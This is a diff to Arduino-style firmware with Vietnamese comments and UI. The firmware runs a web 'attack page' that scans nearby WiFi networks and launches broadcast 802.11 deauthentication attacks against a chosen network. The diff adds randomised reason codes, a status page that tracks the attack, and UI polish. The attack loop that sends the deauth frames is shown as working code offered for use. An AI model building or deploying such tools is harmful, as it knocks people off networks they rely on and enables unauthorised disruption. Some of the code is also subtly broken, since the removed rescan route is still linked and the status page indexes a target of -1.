@@ -32,6 +32,12 @@ bool deauth_running = false;
 uint8_t deauth_bssid[6];
 uint16_t deauth_reason;
 
+
+// Thêm biến toàn cục current_target
+int current_target = -1;  // Biến toàn cục lưu số mạng mục tiêu đang tấn công
+
+
+
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
   if (scan_result->scan_complete == 0) { 
@@ -123,67 +129,97 @@ String makeRedirect(String url) {
 }
 
 void handleRoot(WiFiClient &client) {
-  String html = "<html><body>";
-  // Chỉnh ở đây
-
+  String html = "<html><head>";
   html += "<meta charset='UTF-8'>"; // Đảm bảo trang sử dụng mã hóa UTF-8
-  html += "<style>body { font-family: Arial, sans-serif; }</style>"; // Sử dụng font chữ hỗ trợ tiếng Việt
+  html += "<style>";
+  html += "body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }"; 
+  html += "h1, h2 { color: #333; }"; 
+  html += "table { width: 100%; border-collapse: collapse; margin-top: 20px; }"; 
+  html += "th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }"; 
+  html += "tr:nth-child(even) { background-color: #f2f2f2; }"; 
+  html += "th { background-color: #4CAF50; color: white; }"; 
+  html += "button { padding: 10px 20px; background-color: #4CAF50; border: none; color: white; cursor: pointer; }"; 
+  html += "button:hover { background-color: #45a049; }"; 
+  html += "input[type='text'] { padding: 8px; width: 100%; margin-top: 10px; }"; 
+  html += "form { margin-bottom: 20px; }"; 
+  html += "</style>";
   html += "</head><body>";
 
-
+  html += "<div style='text-align: center; padding: 20px;'>";
   html += "<h1>Trang Tấn Công</h1>";
-html += "<h2>Danh Sách Của Bạn:</h2>";
-html += "<table border='1'><tr><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>RSSI</th><th>Tần Số</th></tr>";
-for (size_t i = 0; i < scan_results.size(); i++) {
-  // Chỉnh ở đây (int i) thành (size_t)
-  html += "<tr><td>" + String(i) + "</td><td>" + scan_results[i].ssid + "</td><td>" + scan_results[i].bssid_str + "</td><td>" + String(scan_results[i].channel) + "</td><td>" + String(scan_results[i].rssi) + "</td><td>" + ((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</tr>";
-}
-// Chỉnh nguyên cái ở dưới thành Tiếng Việt
-html += "</table>";
-html += "<form method='post' action='/rescan'><input type='submit' value='Quét lại các mạng'></form><hr>";
-html += "<form method='post' action='/deauth'>Số mạng: <input type='text' name='net_num'><br>Mã lý do: <input type='text' name='reason'><br><input type='submit' value='Bắt đầu Tấn Công Deauth'></form>";
-html += "<form method='post' action='/stop'><input type='submit' value='Dừng Tấn Công Deauth'></form>";
+  html += "<h2>Danh Sách Các Mạng WiFi</h2>";
+  html += "<table><tr><th>Số</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>RSSI</th><th>Tần Số</th></tr>";
 
-html += "<table border='1'><tr><th>Mã lý do</th><th>Ý nghĩa</th></tr>";
-html += "<tr><td>0</td><td>Được dành riêng.</td></tr>";
-html += "<tr><td>1</td><td>Lý do không xác định.</td></tr>";
-html += "<tr><td>2</td><td>Quá trình xác thực trước đó không còn hợp lệ.</td></tr>";
-html += "<tr><td>3</td><td>Deauth vì trạm gửi (STA) đang rời khỏi hoặc đã rời khỏi Independent Basic Service Set (IBSS) hoặc ESS.</td></tr>";
-html += "<tr><td>4</td><td>Deauth vì không hoạt động.</td></tr>";
-html += "<tr><td>5</td><td>Deauth vì thiết bị WAP không thể xử lý tất cả các STA hiện đang kết nối.</td></tr>";
-html += "<tr><td>6</td><td>Nhận được khung lớp 2 từ STA chưa xác thực.</td></tr>";
-html += "<tr><td>7</td><td>Nhận được khung lớp 3 từ STA chưa kết nối.</td></tr>";
-html += "<tr><td>8</td><td>Deauth vì trạm gửi STA đang rời khỏi hoặc đã rời khỏi Basic Service Set (BSS).</td></tr>";
-html += "<tr><td>9</td><td>STA yêu cầu (tái) kết nối nhưng không được xác thực với STA phản hồi.</td></tr>";
-html += "<tr><td>10</td><td>Deauth vì thông tin trong phần tử Năng lực Công suất không chấp nhận được.</td></tr>";
-html += "<tr><td>11</td><td>Deauth vì thông tin trong phần tử Kênh Hỗ trợ không chấp nhận được.</td></tr>";
-html += "<tr><td>12</td><td>Deauth do Quản lý Chuyển BSS.</td></tr>";
-html += "<tr><td>13</td><td>Phần tử không hợp lệ, tức là một phần tử được định nghĩa trong tiêu chuẩn này nhưng nội dung không đáp ứng các yêu cầu trong Điều 8.</td></tr>";
-html += "<tr><td>14</td><td>Lỗi mã toàn vẹn thông điệp (MIC).</td></tr>";
-html += "<tr><td>15</td><td>Hết thời gian 4-Way Handshake.</td></tr>";
-html += "<tr><td>16</td><td>Hết thời gian Group Key Handshake.</td></tr>";
-html += "<tr><td>17</td><td>Phần tử trong 4-Way Handshake khác với yêu cầu (Re)Association / Probe Response / Beacon frame.</td></tr>";
-html += "<tr><td>18</td><td>Nhóm cipher không hợp lệ.</td></tr>";
-html += "<tr><td>19</td><td>Cipher cá nhân không hợp lệ.</td></tr>";
-html += "<tr><td>20</td><td>AKMP không hợp lệ.</td></tr>";
-html += "<tr><td>21</td><td>Phiên bản RSNE không được hỗ trợ.</td></tr>";
-html += "<tr><td>22</td><td>Các khả năng RSNE không hợp lệ.</td></tr>";
-html += "<tr><td>23</td><td>Xác thực IEEE 802.1X thất bại.</td></tr>";
-html += "<tr><td>24</td><td>Cipher suite bị từ chối vì chính sách bảo mật.</td></tr>";
-html += "</table>";
+  for (size_t i = 0; i < scan_results.size(); i++) {
+    html += "<tr><td>" + String(i + 1) + "</td><td>" + scan_results[i].ssid + "</td><td>" + scan_results[i].bssid_str + "</td><td>" + String(scan_results[i].channel) + "</td><td>" + String(scan_results[i].rssi) + "</td><td>" + ((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td></tr>";
+  }
 
-html += "</body></html>";
+  html += "</table>";
+  html += "<form method='post' action='/rescan'><button type='submit'>Quét lại các mạng</button></form>";
 
+  html += "<h3>Bắt đầu Tấn Công Deauth</h3>";
+  html += "<form method='post' action='/deauth'>";
+
+  html += "<a href='/status'>Xem trạng thái đang tấn công</a><br><br>";
+
+
+
+  // Tạo dropdown cho phép chọn số mạng
+  html += "Chọn mạng: <select name='net_num'><br>";
+  for (size_t i = 0; i < scan_results.size(); i++) {
+    html += "<option value='" + String(i) + "'>" + scan_results[i].ssid + "</option>";
+  }
+  html += "</select><br>";
+
+  int random_reason = random(0, 24);  // Chọn mã lý do ngẫu nhiên từ 0 đến 23
+  html += "<input type='hidden' name='reason' value='" + String(random_reason) + "'>";
+  html += "<button type='submit'>Bắt đầu Tấn Công Deauth</button></form>";
+
+  html += "<form method='post' action='/stop'><button type='submit'>Dừng Tấn Công Deauth</button></form>";
+
+  html += "<h3>Mã Lý Do Tấn Công</h3>";
+  html += "<table><tr><th>Mã lý do</th><th> Sẽ chọn mã lý do ngẫu nhiên mỗi khi tấn công những lý do dưới đây</th></tr>";
+
+
+   html += "<tr><td>0</td><td>Được dành riêng.</td></tr>";
+  html += "<tr><td>1</td><td>Lý do không xác định.</td></tr>";
+  html += "<tr><td>2</td><td>Quá trình xác thực trước đó không còn hợp lệ.</td></tr>";
+  html += "<tr><td>3</td><td>Deauth vì trạm gửi (STA) đang rời khỏi hoặc đã rời khỏi Independent Basic Service Set (IBSS) hoặc ESS.</td></tr>";
+  html += "<tr><td>4</td><td>Deauth vì không hoạt động.</td></tr>";
+  html += "<tr><td>5</td><td>Deauth vì thiết bị WAP không thể xử lý tất cả các STA hiện đang kết nối.</td></tr>";
+  html += "<tr><td>6</td><td>Nhận được khung lớp 2 từ STA chưa xác thực.</td></tr>";
+  html += "<tr><td>7</td><td>Nhận được khung lớp 3 từ STA chưa kết nối.</td></tr>";
+  html += "<tr><td>8</td><td>Deauth vì trạm gửi STA đang rời khỏi hoặc đã rời khỏi Basic Service Set (BSS).</td></tr>";
+  html += "<tr><td>9</td><td>STA yêu cầu (tái) kết nối nhưng không được xác thực với STA phản hồi.</td></tr>";
+  html += "<tr><td>10</td><td>Deauth vì thông tin trong phần tử Năng lực Công suất không chấp nhận được.</td></tr>";
+  html += "<tr><td>11</td><td>Deauth vì thông tin trong phần tử Kênh Hỗ trợ không chấp nhận được.</td></tr>";
+  html += "<tr><td>12</td><td>Deauth do Quản lý Chuyển BSS.</td></tr>";
+  html += "<tr><td>13</td><td>Phần tử không hợp lệ, tức là một phần tử được định nghĩa trong tiêu chuẩn này nhưng nội dung không đáp ứng các yêu cầu trong Điều 8.</td></tr>";
+  html += "<tr><td>14</td><td>Lỗi mã toàn vẹn thông điệp (MIC).</td></tr>";
+  html += "<tr><td>15</td><td>Hết thời gian 4-Way Handshake.</td></tr>";
+  html += "<tr><td>16</td><td>Hết thời gian Group Key Handshake.</td></tr>";
+  html += "<tr><td>17</td><td>Phần tử trong 4-Way Handshake khác với yêu cầu (Re)Association / Probe Response / Beacon frame.</td></tr>";
+  html += "<tr><td>18</td><td>Nhóm cipher không hợp lệ.</td></tr>";
+  html += "<tr><td>19</td><td>Cipher cá nhân không hợp lệ.</td></tr>";
+  html += "<tr><td>20</td><td>AKMP không hợp lệ.</td></tr>";
+  html += "<tr><td>21</td><td>Phiên bản RSNE không được hỗ trợ.</td></tr>";
+  html += "<tr><td>22</td><td>Các khả năng RSNE không hợp lệ.</td></tr>";
+  html += "<tr><td>23</td><td>Xác thực IEEE 802.1X thất bại.</td></tr>";
+  html += "<tr><td>24</td><td>Cipher suite bị từ chối vì chính sách bảo mật.</td></tr>";
+  html += "</table>";
+
+  html += "</div></body></html>";
 
   String response = makeResponse(200, "text/html");
   response += html;
   client.write(response.c_str());
 }
 
+
+
 void handle404(WiFiClient &client) {
-  String response = makeResponse(404, "text/plain");
-  response += "Not found!";
-  client.write(response.c_str());
+   // Thay vì thông báo lỗi, redirect về trang chủ
+  client.write(makeRedirect("/").c_str());
 }
 
 void startDeauth(int network_num) {
@@ -205,6 +241,10 @@ void setup() {
   pinMode(LED_B, OUTPUT);
 
   DEBUG_SER_INIT();
+
+  // Khởi tạo bộ sinh số ngẫu nhiên
+  randomSeed(millis());  // Lấy số ngẫu nhiên
+
 
    // Chỉnh Ở Đây
    
@@ -235,8 +275,52 @@ void setup() {
 
   server.begin();
 
-  digitalWrite(LED_R, HIGH);
+  digitalWrite(LED_G, HIGH);
 }
+
+
+
+void handleDeauthStatus(WiFiClient &client) {
+  String html = "<html><head>";
+  html += "<meta charset='UTF-8'>";
+  html += "<style>";
+  html += "body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }"; 
+  html += "h1, h2 { color: #333; }"; 
+  html += "table { width: 100%; border-collapse: collapse; margin-top: 20px; }"; 
+  html += "th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }"; 
+  html += "tr:nth-child(even) { background-color: #f2f2f2; }"; 
+  html += "th { background-color: #4CAF50; color: white; }"; 
+  html += "button { padding: 10px 20px; background-color: #4CAF50; border: none; color: white; cursor: pointer; }"; 
+  html += "button:hover { background-color: #45a049; }"; 
+  html += "</style>";
+  html += "</head><body>";
+  
+  html += "<div style='text-align: center; padding: 20px;'>";
+  html += "<h1>Trang Theo Dõi Tấn Công Deauth</h1>";
+  
+  // Hiển thị thông tin mạng
+  html += "<h2>Thông tin tấn công:</h2>";
+  html += "<p>Mạng mục tiêu: " + scan_results[current_target].ssid + "</p>";
+  html += "<p>BSSID: " + scan_results[current_target].bssid_str + "</p>";
+  html += "<p>Lý do tấn công: " + String(deauth_reason) + "</p>";
+  
+  // Thêm tốc độ tấn công (mô phỏng)
+  html += "<p>Tốc độ tấn công: 10 gói mỗi giây</p>";  // Bạn có thể thay đổi logic để tính tốc độ thực tế
+  
+  html += "<form method='post' action='/stop'><button type='submit'>Dừng Tấn Công</button></form>";
+  html += "<form method='post' action='/'><button type='submit'>Quay lại Trang Chủ</button></form>";
+
+  html += "</div></body></html>";
+  
+  String response = makeResponse(200, "text/html");
+  response += html;
+  client.write(response.c_str());
+}
+
+
+
+
+
 
 void loop() {
   WiFiClient client = server.available();
@@ -247,41 +331,49 @@ void loop() {
       while (client.available()) request += (char) client.read();
       delay(1);
     }
-    DEBUG_SER_PRINT(request);
+
+     // Log toàn bộ yêu cầu nhận được
+    DEBUG_SER_PRINT("Request received: " + request);
+
     String path = parseRequest(request);
     DEBUG_SER_PRINT("Requested path: " + path + "\n");
 
     if (path == "/") {
       handleRoot(client);
-    } else if (path == "/rescan") {
-      client.write(makeRedirect("/").c_str());
-      if (scanNetworks() != 0) {
-        while(true) delay(1000);
-      }
+    } else if (path == "/deauthstatus") {
+      handleDeauthStatus(client);  // Gọi hàm theo dõi trạng thái tấn công
     } else if (path == "/deauth") {
-      std::map<String, String> post_data = parsePost(request);
+      std::map<String, String> post_data = parsePost(request);  // Lấy dữ liệu POST
       int network_num;
       bool post_valid = true;
-      if (post_data.size() == 2) {
+
+      if (post_data.size() == 2) {  // Kiểm tra xem có đúng 2 trường dữ liệu trong POST
         for (auto& param : post_data) {
           if (param.first == "net_num") {
-            network_num = String(param.second).toInt();
+            network_num = String(param.second).toInt();  // Lấy số mạng từ POST
+            current_target = network_num;  // Lưu lại mạng tấn công
           } else if (param.first == "reason") {
-            deauth_reason = String(param.second).toInt();
+            deauth_reason = String(param.second).toInt();  // Lấy mã lý do từ POST
           } else {
-            post_valid = false;
+            post_valid = false;  // Nếu có trường nào không hợp lệ
             break;
           }
         }
       } else {
-        post_valid = false;
+        post_valid = false;  // Kiểm tra xem dữ liệu có đầy đủ không
       }
-      client.write(makeRedirect("/").c_str());
+
       if (post_valid) {
-        startDeauth(network_num);
+        startDeauth(network_num);  // Bắt đầu tấn công Deauth
+        client.write(makeRedirect("/status").c_str());  // Chuyển hướng đến trang theo dõi
       } else {
-        DEBUG_SER_PRINT("Received invalid post request!\n");
+        DEBUG_SER_PRINT("Received invalid post request!\n");  // In ra nếu có lỗi
+         client.write(makeRedirect("/").c_str());  // Quay lại trang chính nếu có lỗi
       }
+
+    } else if (path == "/status") {
+      handleDeauthStatus(client);  // Xử lý và hiển thị trang theo dõi tấn công
+
     } else if (path == "/stop") {
       deauth_running = false;
       DEBUG_SER_PRINT("Deauth-Attack stopped!");
@@ -294,10 +386,10 @@ void loop() {
     digitalWrite(LED_G, LOW);
   }
   if (deauth_running) {
-    digitalWrite(LED_B, HIGH);
+    digitalWrite(LED_R, HIGH);
     wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
     delay(50);
-    digitalWrite(LED_B, LOW);
+    digitalWrite(LED_R, LOW);
   }
   delay(50);
 }
